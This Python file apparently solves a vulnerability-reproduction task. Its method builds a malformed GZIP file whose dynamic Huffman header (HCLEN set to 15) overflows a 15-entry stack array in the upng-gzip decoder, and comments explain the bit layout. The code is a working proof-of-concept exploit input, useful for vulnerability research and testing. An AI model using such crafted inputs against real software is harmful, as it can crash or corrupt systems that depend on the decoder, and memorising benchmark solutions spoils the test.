import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in upng-gzip.
        The vulnerability occurs because temporary arrays for Huffman code lengths are sized to 15,
        but the format allows up to 19 code lengths. We construct a GZIP file with a dynamic Huffman
        block specifying HCLEN=15 (which implies 19 codes), overflowing the buffer.
        """
        # GZIP Header (10 bytes): ID1=0x1f, ID2=0x8b, CM=8 (Deflate)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
        
        # Deflate Payload Construction (LSB first bit stream):
        # 1. Block Header: BFINAL=1, BTYPE=2 (Dynamic Huffman). Bits: 1, 0, 1
        # 2. HLIT (5 bits): 0 (257 codes). Bits: 00000
        #    -> Byte 0: 00000101 = 0x05
        # 3. HDIST (5 bits): 0 (1 code). Bits: 00000
        # 4. HCLEN (4 bits): 15 (19 code lengths). Bits: 1111
        #    -> Byte 1: 111 (low 3 bits of HCLEN) | 00000 (HDIST) = 0xE0
        #    -> Byte 2 starts with high 1 bit of HCLEN
        # 5. Code Lengths: 19 codes * 3 bits = 57 bits. We set all to 0.
        #    -> Byte 2: 1 (HCLEN high) | 0000000 (partial code lengths) = 0x01
        #    -> Remaining bits: 57 - 7 (in Byte 2) = 50 bits needed.
        #    -> 7 bytes of 0x00 provide 56 bits, sufficient to overflow.
        
        payload = b'\x05\xe0\x01' + b'\x00' * 7
        
        return header + payload
